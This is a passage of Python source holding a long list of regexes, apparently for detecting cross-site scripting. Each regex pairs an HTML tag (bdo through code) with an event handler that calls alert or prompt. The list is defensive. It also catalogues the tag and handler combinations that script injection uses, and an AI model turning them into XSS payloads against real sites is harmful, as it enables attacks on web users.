            r'<bdo[^>]*tabindex[^>]*ondeactivate[^>]*(?:alert|prompt)',
            r'<bdo[^>]*tabindex[^>]*onfocus[^>]*(?:alert|prompt)',
            r'<bdo[^>]*tabindex[^>]*onfocusin[^>]*(?:alert|prompt)',
            r'<bdo[^>]*onbeforecopy[^>]*(?:alert|prompt)',
            r'<bdo[^>]*onbeforecut[^>]*(?:alert|prompt)',
            r'<bdo[^>]*onbeforepaste[^>]*(?:alert|prompt)',
            r'<bdo[^>]*onblur[^>]*(?:alert|prompt)',
            r'<bdo[^>]*onclick[^>]*(?:alert|prompt)',
            r'<bdo[^>]*oncontextmenu[^>]*(?:alert|prompt)',
            r'<bdo[^>]*oncopy[^>]*(?:alert|prompt)',
            r'<bdo[^>]*oncut[^>]*(?:alert|prompt)',
            r'<bdo[^>]*ondblclick[^>]*(?:alert|prompt)',
            r'<bdo[^>]*onfocusout[^>]*(?:alert|prompt)',
            r'<bdo[^>]*onkeydown[^>]*(?:alert|prompt)',
            r'<bdo[^>]*onkeypress[^>]*(?:alert|prompt)',
            r'<bdo[^>]*onkeyup[^>]*(?:alert|prompt)',
            r'<bdo[^>]*onmousedown[^>]*(?:alert|prompt)',
            r'<bdo[^>]*onmouseenter[^>]*(?:alert|prompt)',
            r'<bdo[^>]*onmouseleave[^>]*(?:alert|prompt)',
            r'<bdo[^>]*onmousemove[^>]*(?:alert|prompt)',
            r'<bdo[^>]*onmouseout[^>]*(?:alert|prompt)',
            r'<bdo[^>]*onmouseover[^>]*(?:alert|prompt)',
            r'<bdo[^>]*onmouseup[^>]*(?:alert|prompt)',
            r'<bdo[^>]*onpaste[^>]*(?:alert|prompt)',
            
            # BGSound patterns
            r'<bgsound[^>]*draggable[^>]*ondrag[^>]*(?:alert|prompt)',
            r'<bgsound[^>]*draggable[^>]*ondragend[^>]*(?:alert|prompt)',
            r'<bgsound[^>]*draggable[^>]*ondragenter[^>]*(?:alert|prompt)',
            r'<bgsound[^>]*draggable[^>]*ondragleave[^>]*(?:alert|prompt)',
            r'<bgsound[^>]*draggable[^>]*ondragstart[^>]*(?:alert|prompt)',
            r'<bgsound[^>]*tabindex[^>]*onactivate[^>]*(?:alert|prompt)',
            r'<bgsound[^>]*tabindex[^>]*onbeforeactivate[^>]*(?:alert|prompt)',
            r'<bgsound[^>]*tabindex[^>]*onbeforedeactivate[^>]*(?:alert|prompt)',
            r'<bgsound[^>]*tabindex[^>]*ondeactivate[^>]*(?:alert|prompt)',
            r'<bgsound[^>]*tabindex[^>]*onfocus[^>]*(?:alert|prompt)',
            r'<bgsound[^>]*tabindex[^>]*onfocusin[^>]*(?:alert|prompt)',
            r'<bgsound[^>]*onbeforecopy[^>]*(?:alert|prompt)',
            r'<bgsound[^>]*onbeforecut[^>]*(?:alert|prompt)',
            r'<bgsound[^>]*onbeforepaste[^>]*(?:alert|prompt)',
            r'<bgsound[^>]*onblur[^>]*(?:alert|prompt)',
            r'<bgsound[^>]*onclick[^>]*(?:alert|prompt)',
            r'<bgsound[^>]*oncontextmenu[^>]*(?:alert|prompt)',
            r'<bgsound[^>]*oncopy[^>]*(?:alert|prompt)',
            r'<bgsound[^>]*oncut[^>]*(?:alert|prompt)',
            r'<bgsound[^>]*ondblclick[^>]*(?:alert|prompt)',
            r'<bgsound[^>]*onfocusout[^>]*(?:alert|prompt)',
            r'<bgsound[^>]*onkeydown[^>]*(?:alert|prompt)',
            r'<bgsound[^>]*onkeypress[^>]*(?:alert|prompt)',
            r'<bgsound[^>]*onkeyup[^>]*(?:alert|prompt)',
            r'<bgsound[^>]*onmousedown[^>]*(?:alert|prompt)',
            r'<bgsound[^>]*onmouseenter[^>]*(?:alert|prompt)',
            r'<bgsound[^>]*onmouseleave[^>]*(?:alert|prompt)',
            r'<bgsound[^>]*onmousemove[^>]*(?:alert|prompt)',
            r'<bgsound[^>]*onmouseout[^>]*(?:alert|prompt)',
            r'<bgsound[^>]*onmouseover[^>]*(?:alert|prompt)',
            r'<bgsound[^>]*onmouseup[^>]*(?:alert|prompt)',
            r'<bgsound[^>]*onpaste[^>]*(?:alert|prompt)',
            
            # Big patterns
            r'<big[^>]*draggable[^>]*ondrag[^>]*(?:alert|prompt)',
            r'<big[^>]*draggable[^>]*ondragend[^>]*(?:alert|prompt)',
            r'<big[^>]*draggable[^>]*ondragenter[^>]*(?:alert|prompt)',
            r'<big[^>]*draggable[^>]*ondragleave[^>]*(?:alert|prompt)',
            r'<big[^>]*draggable[^>]*ondragstart[^>]*(?:alert|prompt)',
            r'<big[^>]*tabindex[^>]*onactivate[^>]*(?:alert|prompt)',
            r'<big[^>]*tabindex[^>]*onbeforeactivate[^>]*(?:alert|prompt)',
            r'<big[^>]*tabindex[^>]*onbeforedeactivate[^>]*(?:alert|prompt)',
            r'<big[^>]*tabindex[^>]*ondeactivate[^>]*(?:alert|prompt)',
            r'<big[^>]*tabindex[^>]*onfocus[^>]*(?:alert|prompt)',
            r'<big[^>]*tabindex[^>]*onfocusin[^>]*(?:alert|prompt)',
            r'<big[^>]*onbeforecopy[^>]*(?:alert|prompt)',
            r'<big[^>]*onbeforecut[^>]*(?:alert|prompt)',
            r'<big[^>]*onbeforepaste[^>]*(?:alert|prompt)',
            r'<big[^>]*onblur[^>]*(?:alert|prompt)',
            r'<big[^>]*onclick[^>]*(?:alert|prompt)',
            r'<big[^>]*oncontextmenu[^>]*(?:alert|prompt)',
            r'<big[^>]*oncopy[^>]*(?:alert|prompt)',
            r'<big[^>]*oncut[^>]*(?:alert|prompt)',
            r'<big[^>]*ondblclick[^>]*(?:alert|prompt)',
            r'<big[^>]*onfocusout[^>]*(?:alert|prompt)',
            r'<big[^>]*onkeydown[^>]*(?:alert|prompt)',
            r'<big[^>]*onkeypress[^>]*(?:alert|prompt)',
            r'<big[^>]*onkeyup[^>]*(?:alert|prompt)',
            r'<big[^>]*onmousedown[^>]*(?:alert|prompt)',
            r'<big[^>]*onmouseenter[^>]*(?:alert|prompt)',
            r'<big[^>]*onmouseleave[^>]*(?:alert|prompt)',
            r'<big[^>]*onmousemove[^>]*(?:alert|prompt)',
            r'<big[^>]*onmouseout[^>]*(?:alert|prompt)',
            r'<big[^>]*onmouseover[^>]*(?:alert|prompt)',
            r'<big[^>]*onmouseup[^>]*(?:alert|prompt)',
            r'<big[^>]*onpaste[^>]*(?:alert|prompt)',
            
            # Blink patterns
            r'<blink[^>]*draggable[^>]*ondrag[^>]*(?:alert|prompt)',
            r'<blink[^>]*draggable[^>]*ondragend[^>]*(?:alert|prompt)',
            r'<blink[^>]*draggable[^>]*ondragenter[^>]*(?:alert|prompt)',
            r'<blink[^>]*draggable[^>]*ondragleave[^>]*(?:alert|prompt)',
            r'<blink[^>]*draggable[^>]*ondragstart[^>]*(?:alert|prompt)',
            r'<blink[^>]*tabindex[^>]*onactivate[^>]*(?:alert|prompt)',
            r'<blink[^>]*tabindex[^>]*onbeforeactivate[^>]*(?:alert|prompt)',
            r'<blink[^>]*tabindex[^>]*onbeforedeactivate[^>]*(?:alert|prompt)',
            r'<blink[^>]*tabindex[^>]*ondeactivate[^>]*(?:alert|prompt)',
            r'<blink[^>]*tabindex[^>]*onfocus[^>]*(?:alert|prompt)',
            r'<blink[^>]*tabindex[^>]*onfocusin[^>]*(?:alert|prompt)',
            r'<blink[^>]*onbeforecopy[^>]*(?:alert|prompt)',
            r'<blink[^>]*onbeforecut[^>]*(?:alert|prompt)',
            r'<blink[^>]*onbeforepaste[^>]*(?:alert|prompt)',
            r'<blink[^>]*onblur[^>]*(?:alert|prompt)',
            r'<blink[^>]*onclick[^>]*(?:alert|prompt)',
            r'<blink[^>]*oncontextmenu[^>]*(?:alert|prompt)',
            r'<blink[^>]*oncopy[^>]*(?:alert|prompt)',
            r'<blink[^>]*oncut[^>]*(?:alert|prompt)',
            r'<blink[^>]*ondblclick[^>]*(?:alert|prompt)',
            r'<blink[^>]*onfocusout[^>]*(?:alert|prompt)',
            r'<blink[^>]*onkeydown[^>]*(?:alert|prompt)',
            r'<blink[^>]*onkeypress[^>]*(?:alert|prompt)',
            r'<blink[^>]*onkeyup[^>]*(?:alert|prompt)',
            r'<blink[^>]*onmousedown[^>]*(?:alert|prompt)',
            r'<blink[^>]*onmouseenter[^>]*(?:alert|prompt)',
            r'<blink[^>]*onmouseleave[^>]*(?:alert|prompt)',
            r'<blink[^>]*onmousemove[^>]*(?:alert|prompt)',
            r'<blink[^>]*onmouseout[^>]*(?:alert|prompt)',
            r'<blink[^>]*onmouseover[^>]*(?:alert|prompt)',
            r'<blink[^>]*onmouseup[^>]*(?:alert|prompt)',
            r'<blink[^>]*onpaste[^>]*(?:alert|prompt)',
            
            # Blockquote patterns
            r'<blockquote[^>]*draggable[^>]*ondrag[^>]*(?:alert|prompt)',
            r'<blockquote[^>]*draggable[^>]*ondragend[^>]*(?:alert|prompt)',
            r'<blockquote[^>]*draggable[^>]*ondragenter[^>]*(?:alert|prompt)',
            r'<blockquote[^>]*draggable[^>]*ondragleave[^>]*(?:alert|prompt)',
            r'<blockquote[^>]*draggable[^>]*ondragstart[^>]*(?:alert|prompt)',
            r'<blockquote[^>]*tabindex[^>]*onactivate[^>]*(?:alert|prompt)',
            r'<blockquote[^>]*tabindex[^>]*onbeforeactivate[^>]*(?:alert|prompt)',
            r'<blockquote[^>]*tabindex[^>]*onbeforedeactivate[^>]*(?:alert|prompt)',
            r'<blockquote[^>]*tabindex[^>]*ondeactivate[^>]*(?:alert|prompt)',
            r'<blockquote[^>]*tabindex[^>]*onfocus[^>]*(?:alert|prompt)',
            r'<blockquote[^>]*tabindex[^>]*onfocusin[^>]*(?:alert|prompt)',
            r'<blockquote[^>]*onbeforecopy[^>]*(?:alert|prompt)',
            r'<blockquote[^>]*onbeforecut[^>]*(?:alert|prompt)',
            r'<blockquote[^>]*onbeforepaste[^>]*(?:alert|prompt)',
            r'<blockquote[^>]*onblur[^>]*(?:alert|prompt)',
            r'<blockquote[^>]*onclick[^>]*(?:alert|prompt)',
            r'<blockquote[^>]*oncontextmenu[^>]*(?:alert|prompt)',
            r'<blockquote[^>]*oncopy[^>]*(?:alert|prompt)',
            r'<blockquote[^>]*oncut[^>]*(?:alert|prompt)',
            r'<blockquote[^>]*ondblclick[^>]*(?:alert|prompt)',
            r'<blockquote[^>]*onfocusout[^>]*(?:alert|prompt)',
            r'<blockquote[^>]*onkeydown[^>]*(?:alert|prompt)',
            r'<blockquote[^>]*onkeypress[^>]*(?:alert|prompt)',
            r'<blockquote[^>]*onkeyup[^>]*(?:alert|prompt)',
            r'<blockquote[^>]*onmousedown[^>]*(?:alert|prompt)',
            r'<blockquote[^>]*onmouseenter[^>]*(?:alert|prompt)',
            r'<blockquote[^>]*onmouseleave[^>]*(?:alert|prompt)',
            r'<blockquote[^>]*onmousemove[^>]*(?:alert|prompt)',
            r'<blockquote[^>]*onmouseout[^>]*(?:alert|prompt)',
            r'<blockquote[^>]*onmouseover[^>]*(?:alert|prompt)',
            r'<blockquote[^>]*onmouseup[^>]*(?:alert|prompt)',
            r'<blockquote[^>]*onpaste[^>]*(?:alert|prompt)',
            
            # Body patterns (additional)
            r'<body[^>]*draggable[^>]*ondrag[^>]*(?:alert|prompt)',
            r'<body[^>]*draggable[^>]*ondragend[^>]*(?:alert|prompt)',
            r'<body[^>]*draggable[^>]*ondragenter[^>]*(?:alert|prompt)',
            r'<body[^>]*draggable[^>]*ondragleave[^>]*(?:alert|prompt)',
            r'<body[^>]*draggable[^>]*ondragstart[^>]*(?:alert|prompt)',
            r'<body[^>]*tabindex[^>]*onactivate[^>]*(?:alert|prompt)',
            r'<body[^>]*tabindex[^>]*onbeforeactivate[^>]*(?:alert|prompt)',
            r'<body[^>]*tabindex[^>]*onbeforedeactivate[^>]*(?:alert|prompt)',
            r'<body[^>]*tabindex[^>]*ondeactivate[^>]*(?:alert|prompt)',
            r'<body[^>]*tabindex[^>]*onfocus[^>]*(?:alert|prompt)',
            r'<body[^>]*tabindex[^>]*onfocusin[^>]*(?:alert|prompt)',
            r'<body[^>]*onafterprint[^>]*(?:alert|prompt)',
            r'<body[^>]*onbeforecopy[^>]*(?:alert|prompt)',
            r'<body[^>]*onbeforecut[^>]*(?:alert|prompt)',
            r'<body[^>]*onbeforepaste[^>]*(?:alert|prompt)',
            r'<body[^>]*onbeforeprint[^>]*(?:alert|prompt)',
            r'<body[^>]*onbeforeunload[^>]*(?:alert|prompt)',
            r'<body[^>]*onblur[^>]*(?:alert|prompt)',
            r'<body[^>]*onclick[^>]*(?:alert|prompt)',
            r'<body[^>]*oncontextmenu[^>]*(?:alert|prompt)',
            r'<body[^>]*oncopy[^>]*(?:alert|prompt)',
            r'<body[^>]*oncut[^>]*(?:alert|prompt)',
            r'<body[^>]*ondblclick[^>]*(?:alert|prompt)',
            r'<body[^>]*onerror[^>]*(?:alert|prompt)',
            r'<body[^>]*onfocusout[^>]*(?:alert|prompt)',
            r'<body[^>]*onhashchange[^>]*(?:alert|prompt)',
            r'<body[^>]*onkeydown[^>]*(?:alert|prompt)',
            r'<body[^>]*onkeypress[^>]*(?:alert|prompt)',
            r'<body[^>]*onkeyup[^>]*(?:alert|prompt)',
            r'<body[^>]*onload[^>]*(?:alert|prompt)',
            r'<body[^>]*onmessage[^>]*(?:alert|prompt)',
            r'<body[^>]*onmousedown[^>]*(?:alert|prompt)',
            r'<body[^>]*onmouseenter[^>]*(?:alert|prompt)',
            r'<body[^>]*onmouseleave[^>]*(?:alert|prompt)',
            r'<body[^>]*onmousemove[^>]*(?:alert|prompt)',
            r'<body[^>]*onmouseout[^>]*(?:alert|prompt)',
            r'<body[^>]*onmouseover[^>]*(?:alert|prompt)',
            r'<body[^>]*onmouseup[^>]*(?:alert|prompt)',
            r'<body[^>]*onpageshow[^>]*(?:alert|prompt)',
            r'<body[^>]*onpaste[^>]*(?:alert|prompt)',
            r'<body[^>]*onpopstate[^>]*(?:alert|prompt)',
            r'<body[^>]*onresize[^>]*(?:alert|prompt)',
            r'<body[^>]*onscroll[^>]*(?:alert|prompt)',
            r'<body[^>]*onunhandledrejection[^>]*(?:alert|prompt)',
            r'<body[^>]*onwheel[^>]*(?:alert|prompt)',
            
            # BR patterns
            r'<br[^>]*draggable[^>]*ondrag[^>]*(?:alert|prompt)',
            r'<br[^>]*draggable[^>]*ondragend[^>]*(?:alert|prompt)',
            r'<br[^>]*draggable[^>]*ondragenter[^>]*(?:alert|prompt)',
            r'<br[^>]*draggable[^>]*ondragleave[^>]*(?:alert|prompt)',
            r'<br[^>]*draggable[^>]*ondragstart[^>]*(?:alert|prompt)',
            r'<br[^>]*tabindex[^>]*onactivate[^>]*(?:alert|prompt)',
            r'<br[^>]*tabindex[^>]*onbeforeactivate[^>]*(?:alert|prompt)',
            r'<br[^>]*tabindex[^>]*onbeforedeactivate[^>]*(?:alert|prompt)',
            r'<br[^>]*tabindex[^>]*ondeactivate[^>]*(?:alert|prompt)',
            r'<br[^>]*tabindex[^>]*onfocus[^>]*(?:alert|prompt)',
            r'<br[^>]*tabindex[^>]*onfocusin[^>]*(?:alert|prompt)',
            r'<br[^>]*onbeforecopy[^>]*(?:alert|prompt)',
            r'<br[^>]*onbeforecut[^>]*(?:alert|prompt)',
            r'<br[^>]*onbeforepaste[^>]*(?:alert|prompt)',
            r'<br[^>]*onblur[^>]*(?:alert|prompt)',
            r'<br[^>]*onclick[^>]*(?:alert|prompt)',
            r'<br[^>]*oncontextmenu[^>]*(?:alert|prompt)',
            r'<br[^>]*oncopy[^>]*(?:alert|prompt)',
            r'<br[^>]*oncut[^>]*(?:alert|prompt)',
            r'<br[^>]*ondblclick[^>]*(?:alert|prompt)',
            r'<br[^>]*onfocusout[^>]*(?:alert|prompt)',
            r'<br[^>]*onkeydown[^>]*(?:alert|prompt)',
            r'<br[^>]*onkeypress[^>]*(?:alert|prompt)',
            r'<br[^>]*onkeyup[^>]*(?:alert|prompt)',
            r'<br[^>]*onmousedown[^>]*(?:alert|prompt)',
            r'<br[^>]*onmouseenter[^>]*(?:alert|prompt)',
            r'<br[^>]*onmouseleave[^>]*(?:alert|prompt)',
            r'<br[^>]*onmousemove[^>]*(?:alert|prompt)',
            r'<br[^>]*onmouseout[^>]*(?:alert|prompt)',
            r'<br[^>]*onmouseover[^>]*(?:alert|prompt)',
            r'<br[^>]*onmouseup[^>]*(?:alert|prompt)',
            r'<br[^>]*onpaste[^>]*(?:alert|prompt)',
            
            # Button patterns
            r'<button[^>]*autofocus[^>]*onfocus[^>]*(?:alert|prompt)',
            r'<button[^>]*autofocus[^>]*onfocusin[^>]*(?:alert|prompt)',
            r'<button[^>]*draggable[^>]*ondrag[^>]*(?:alert|prompt)',
            r'<button[^>]*draggable[^>]*ondragend[^>]*(?:alert|prompt)',
            r'<button[^>]*draggable[^>]*ondragenter[^>]*(?:alert|prompt)',
            r'<button[^>]*draggable[^>]*ondragleave[^>]*(?:alert|prompt)',
            r'<button[^>]*draggable[^>]*ondragstart[^>]*(?:alert|prompt)',
            r'<button[^>]*tabindex[^>]*onactivate[^>]*(?:alert|prompt)',
            r'<button[^>]*tabindex[^>]*onbeforeactivate[^>]*(?:alert|prompt)',
            r'<button[^>]*tabindex[^>]*onbeforedeactivate[^>]*(?:alert|prompt)',
            r'<button[^>]*tabindex[^>]*ondeactivate[^>]*(?:alert|prompt)',
            r'<button[^>]*onbeforecopy[^>]*(?:alert|prompt)',
            r'<button[^>]*onbeforecut[^>]*(?:alert|prompt)',
            r'<button[^>]*onbeforepaste[^>]*(?:alert|prompt)',
            r'<button[^>]*onblur[^>]*(?:alert|prompt)',
            r'<button[^>]*onclick[^>]*(?:alert|prompt)',
            r'<button[^>]*oncontextmenu[^>]*(?:alert|prompt)',
            r'<button[^>]*oncopy[^>]*(?:alert|prompt)',
            r'<button[^>]*oncut[^>]*(?:alert|prompt)',
            r'<button[^>]*ondblclick[^>]*(?:alert|prompt)',
            r'<button[^>]*onfocusout[^>]*(?:alert|prompt)',
            r'<button[^>]*onkeydown[^>]*(?:alert|prompt)',
            r'<button[^>]*onkeypress[^>]*(?:alert|prompt)',
            r'<button[^>]*onkeyup[^>]*(?:alert|prompt)',
            r'<button[^>]*onmousedown[^>]*(?:alert|prompt)',
            r'<button[^>]*onmouseenter[^>]*(?:alert|prompt)',
            r'<button[^>]*onmouseleave[^>]*(?:alert|prompt)',
            r'<button[^>]*onmousemove[^>]*(?:alert|prompt)',
            r'<button[^>]*onmouseout[^>]*(?:alert|prompt)',
            r'<button[^>]*onmouseover[^>]*(?:alert|prompt)',
            r'<button[^>]*onmouseup[^>]*(?:alert|prompt)',
            r'<button[^>]*onpaste[^>]*(?:alert|prompt)',
            
            # Canvas patterns
            r'<canvas[^>]*draggable[^>]*ondrag[^>]*(?:alert|prompt)',
            r'<canvas[^>]*draggable[^>]*ondragend[^>]*(?:alert|prompt)',
            r'<canvas[^>]*draggable[^>]*ondragenter[^>]*(?:alert|prompt)',
            r'<canvas[^>]*draggable[^>]*ondragleave[^>]*(?:alert|prompt)',
            r'<canvas[^>]*draggable[^>]*ondragstart[^>]*(?:alert|prompt)',
            r'<canvas[^>]*tabindex[^>]*onactivate[^>]*(?:alert|prompt)',
            r'<canvas[^>]*tabindex[^>]*onbeforeactivate[^>]*(?:alert|prompt)',
            r'<canvas[^>]*tabindex[^>]*onbeforedeactivate[^>]*(?:alert|prompt)',
            r'<canvas[^>]*tabindex[^>]*ondeactivate[^>]*(?:alert|prompt)',
            r'<canvas[^>]*tabindex[^>]*onfocus[^>]*(?:alert|prompt)',
            r'<canvas[^>]*tabindex[^>]*onfocusin[^>]*(?:alert|prompt)',
            r'<canvas[^>]*onbeforecopy[^>]*(?:alert|prompt)',
            r'<canvas[^>]*onbeforecut[^>]*(?:alert|prompt)',
            r'<canvas[^>]*onbeforepaste[^>]*(?:alert|prompt)',
            r'<canvas[^>]*onblur[^>]*(?:alert|prompt)',
            r'<canvas[^>]*onclick[^>]*(?:alert|prompt)',
            r'<canvas[^>]*oncontextmenu[^>]*(?:alert|prompt)',
            r'<canvas[^>]*oncopy[^>]*(?:alert|prompt)',
            r'<canvas[^>]*oncut[^>]*(?:alert|prompt)',
            r'<canvas[^>]*ondblclick[^>]*(?:alert|prompt)',
            r'<canvas[^>]*onfocusout[^>]*(?:alert|prompt)',
            r'<canvas[^>]*onkeydown[^>]*(?:alert|prompt)',
            r'<canvas[^>]*onkeypress[^>]*(?:alert|prompt)',
            r'<canvas[^>]*onkeyup[^>]*(?:alert|prompt)',
            r'<canvas[^>]*onmousedown[^>]*(?:alert|prompt)',
            r'<canvas[^>]*onmouseenter[^>]*(?:alert|prompt)',
            r'<canvas[^>]*onmouseleave[^>]*(?:alert|prompt)',
            r'<canvas[^>]*onmousemove[^>]*(?:alert|prompt)',
            r'<canvas[^>]*onmouseout[^>]*(?:alert|prompt)',
            r'<canvas[^>]*onmouseover[^>]*(?:alert|prompt)',
            r'<canvas[^>]*onmouseup[^>]*(?:alert|prompt)',
            r'<canvas[^>]*onpaste[^>]*(?:alert|prompt)',
            
            # Caption patterns
            r'<caption[^>]*draggable[^>]*ondrag[^>]*(?:alert|prompt)',
            r'<caption[^>]*draggable[^>]*ondragend[^>]*(?:alert|prompt)',
            r'<caption[^>]*draggable[^>]*ondragenter[^>]*(?:alert|prompt)',
            r'<caption[^>]*draggable[^>]*ondragleave[^>]*(?:alert|prompt)',
            r'<caption[^>]*draggable[^>]*ondragstart[^>]*(?:alert|prompt)',
            r'<caption[^>]*tabindex[^>]*onactivate[^>]*(?:alert|prompt)',
            r'<caption[^>]*tabindex[^>]*onbeforeactivate[^>]*(?:alert|prompt)',
            r'<caption[^>]*tabindex[^>]*onbeforedeactivate[^>]*(?:alert|prompt)',
            r'<caption[^>]*tabindex[^>]*ondeactivate[^>]*(?:alert|prompt)',
            r'<caption[^>]*tabindex[^>]*onfocus[^>]*(?:alert|prompt)',
            r'<caption[^>]*tabindex[^>]*onfocusin[^>]*(?:alert|prompt)',
            r'<caption[^>]*onbeforecopy[^>]*(?:alert|prompt)',
            r'<caption[^>]*onbeforecut[^>]*(?:alert|prompt)',
            r'<caption[^>]*onbeforepaste[^>]*(?:alert|prompt)',
            r'<caption[^>]*onblur[^>]*(?:alert|prompt)',
            r'<caption[^>]*onclick[^>]*(?:alert|prompt)',
            r'<caption[^>]*oncontextmenu[^>]*(?:alert|prompt)',
            r'<caption[^>]*oncopy[^>]*(?:alert|prompt)',
            r'<caption[^>]*oncut[^>]*(?:alert|prompt)',
            r'<caption[^>]*ondblclick[^>]*(?:alert|prompt)',
            r'<caption[^>]*onfocusout[^>]*(?:alert|prompt)',
            r'<caption[^>]*onkeydown[^>]*(?:alert|prompt)',
            r'<caption[^>]*onkeypress[^>]*(?:alert|prompt)',
            r'<caption[^>]*onkeyup[^>]*(?:alert|prompt)',
            r'<caption[^>]*onmousedown[^>]*(?:alert|prompt)',
            r'<caption[^>]*onmouseenter[^>]*(?:alert|prompt)',
            r'<caption[^>]*onmouseleave[^>]*(?:alert|prompt)',
            r'<caption[^>]*onmousemove[^>]*(?:alert|prompt)',
            r'<caption[^>]*onmouseout[^>]*(?:alert|prompt)',
            r'<caption[^>]*onmouseover[^>]*(?:alert|prompt)',
            r'<caption[^>]*onmouseup[^>]*(?:alert|prompt)',
            r'<caption[^>]*onpaste[^>]*(?:alert|prompt)',
            
            # Center patterns
            r'<center[^>]*draggable[^>]*ondrag[^>]*(?:alert|prompt)',
            r'<center[^>]*draggable[^>]*ondragend[^>]*(?:alert|prompt)',
            r'<center[^>]*draggable[^>]*ondragenter[^>]*(?:alert|prompt)',
            r'<center[^>]*draggable[^>]*ondragleave[^>]*(?:alert|prompt)',
            r'<center[^>]*draggable[^>]*ondragstart[^>]*(?:alert|prompt)',
            r'<center[^>]*tabindex[^>]*onactivate[^>]*(?:alert|prompt)',
            r'<center[^>]*tabindex[^>]*onbeforeactivate[^>]*(?:alert|prompt)',
            r'<center[^>]*tabindex[^>]*onbeforedeactivate[^>]*(?:alert|prompt)',
            r'<center[^>]*tabindex[^>]*ondeactivate[^>]*(?:alert|prompt)',
            r'<center[^>]*tabindex[^>]*onfocus[^>]*(?:alert|prompt)',
            r'<center[^>]*tabindex[^>]*onfocusin[^>]*(?:alert|prompt)',
            r'<center[^>]*onbeforecopy[^>]*(?:alert|prompt)',
            r'<center[^>]*onbeforecut[^>]*(?:alert|prompt)',
            r'<center[^>]*onbeforepaste[^>]*(?:alert|prompt)',
            r'<center[^>]*onblur[^>]*(?:alert|prompt)',
            r'<center[^>]*onclick[^>]*(?:alert|prompt)',
            r'<center[^>]*oncontextmenu[^>]*(?:alert|prompt)',
            r'<center[^>]*oncopy[^>]*(?:alert|prompt)',
            r'<center[^>]*oncut[^>]*(?:alert|prompt)',
            r'<center[^>]*ondblclick[^>]*(?:alert|prompt)',
            r'<center[^>]*onfocusout[^>]*(?:alert|prompt)',
            r'<center[^>]*onkeydown[^>]*(?:alert|prompt)',
            r'<center[^>]*onkeypress[^>]*(?:alert|prompt)',
            r'<center[^>]*onkeyup[^>]*(?:alert|prompt)',
            r'<center[^>]*onmousedown[^>]*(?:alert|prompt)',
            r'<center[^>]*onmouseenter[^>]*(?:alert|prompt)',
            r'<center[^>]*onmouseleave[^>]*(?:alert|prompt)',
            r'<center[^>]*onmousemove[^>]*(?:alert|prompt)',
            r'<center[^>]*onmouseout[^>]*(?:alert|prompt)',
            r'<center[^>]*onmouseover[^>]*(?:alert|prompt)',
            r'<center[^>]*onmouseup[^>]*(?:alert|prompt)',
            r'<center[^>]*onpaste[^>]*(?:alert|prompt)',
            
            # Cite patterns
            r'<cite[^>]*draggable[^>]*ondrag[^>]*(?:alert|prompt)',
            r'<cite[^>]*draggable[^>]*ondragend[^>]*(?:alert|prompt)',
            r'<cite[^>]*draggable[^>]*ondragenter[^>]*(?:alert|prompt)',
            r'<cite[^>]*draggable[^>]*ondragleave[^>]*(?:alert|prompt)',
            r'<cite[^>]*draggable[^>]*ondragstart[^>]*(?:alert|prompt)',
            r'<cite[^>]*tabindex[^>]*onactivate[^>]*(?:alert|prompt)',
            r'<cite[^>]*tabindex[^>]*onbeforeactivate[^>]*(?:alert|prompt)',
            r'<cite[^>]*tabindex[^>]*onbeforedeactivate[^>]*(?:alert|prompt)',
            r'<cite[^>]*tabindex[^>]*ondeactivate[^>]*(?:alert|prompt)',
            r'<cite[^>]*tabindex[^>]*onfocus[^>]*(?:alert|prompt)',
            r'<cite[^>]*tabindex[^>]*onfocusin[^>]*(?:alert|prompt)',
            r'<cite[^>]*onbeforecopy[^>]*(?:alert|prompt)',
            r'<cite[^>]*onbeforecut[^>]*(?:alert|prompt)',
            r'<cite[^>]*onbeforepaste[^>]*(?:alert|prompt)',
            r'<cite[^>]*onblur[^>]*(?:alert|prompt)',
            r'<cite[^>]*onclick[^>]*(?:alert|prompt)',
            r'<cite[^>]*oncontextmenu[^>]*(?:alert|prompt)',
            r'<cite[^>]*oncopy[^>]*(?:alert|prompt)',
            r'<cite[^>]*oncut[^>]*(?:alert|prompt)',
            r'<cite[^>]*ondblclick[^>]*(?:alert|prompt)',
            r'<cite[^>]*onfocusout[^>]*(?:alert|prompt)',
            r'<cite[^>]*onkeydown[^>]*(?:alert|prompt)',
            r'<cite[^>]*onkeypress[^>]*(?:alert|prompt)',
            r'<cite[^>]*onkeyup[^>]*(?:alert|prompt)',
            r'<cite[^>]*onmousedown[^>]*(?:alert|prompt)',
            r'<cite[^>]*onmouseenter[^>]*(?:alert|prompt)',
            r'<cite[^>]*onmouseleave[^>]*(?:alert|prompt)',
            r'<cite[^>]*onmousemove[^>]*(?:alert|prompt)',
            r'<cite[^>]*onmouseout[^>]*(?:alert|prompt)',
            r'<cite[^>]*onmouseover[^>]*(?:alert|prompt)',
            r'<cite[^>]*onmouseup[^>]*(?:alert|prompt)',
            r'<cite[^>]*onpaste[^>]*(?:alert|prompt)',
            
            # Code patterns
            r'<code[^>]*draggable[^>]*ondrag[^>]*(?:alert|prompt)',
            r'<code[^>]*draggable[^>]*ondragend[^>]*(?:alert|prompt)',
            r'<code[^>]*draggable[^>]*ondragenter[^>]*(?:alert|prompt)',
            r'<code[^>]*draggable[^>]*ondragleave[^>]*(?:alert|prompt)',
            r'<code[^>]*draggable[^>]*ondragstart[^>]*(?:alert|prompt)',
            r'<code[^>]*tabindex[^>]*onactivate[^>]*(?:alert|prompt)',
            r'<code[^>]*tabindex[^>]*onbeforeactivate[^>]*(?:alert|prompt)',
            r'<code[^>]*tabindex[^>]*onbeforedeactivate[^>]*(?:alert|prompt)',
            r'<code[^>]*tabindex[^>]*ondeactivate[^>]*(?:alert|prompt)',
            r'<code[^>]*tabindex[^>]*onfocus[^>]*(?:alert|prompt)',
            r'<code[^>]*tabindex[^>]*onfocusin[^>]*(?:alert|prompt)',
            r'<code[^>]*onbeforecopy[^>]*(?:alert|prompt)',
            r'<code[^>]*onbeforecut[^>]*(?:alert|prompt)',
            r'<code[^>]*onbeforepaste[^>]*(?:alert|prompt)',
            r'<code[^>]*onblur[^>]*(?:alert|prompt)',
            r'<code[^>]*onclick[^>]*(?:alert|prompt)',
            r'<code[^>]*oncontextmenu[^>]*(?:alert|prompt)',
            r'<code[^>]*oncopy[^>]*(?:alert|prompt)',
            r'<code[^>]*oncut[^>]*(?:alert|prompt)',
            r'<code[^>]*ondblclick[^>]*(?:alert|prompt)',
            r'<code[^>]*onfocusout[^>]*(?:alert|prompt)',
            r'<code[^>]*onkeydown[^>]*(?:alert|prompt)',
            r'<code[^>]*onkeypress[^>]*(?:alert|prompt)',
            r'<code[^>]*onkeyup[^>]*(?:alert|prompt)',
            r'<code[^>]*onmousedown[^>]*(?:alert|prompt)',
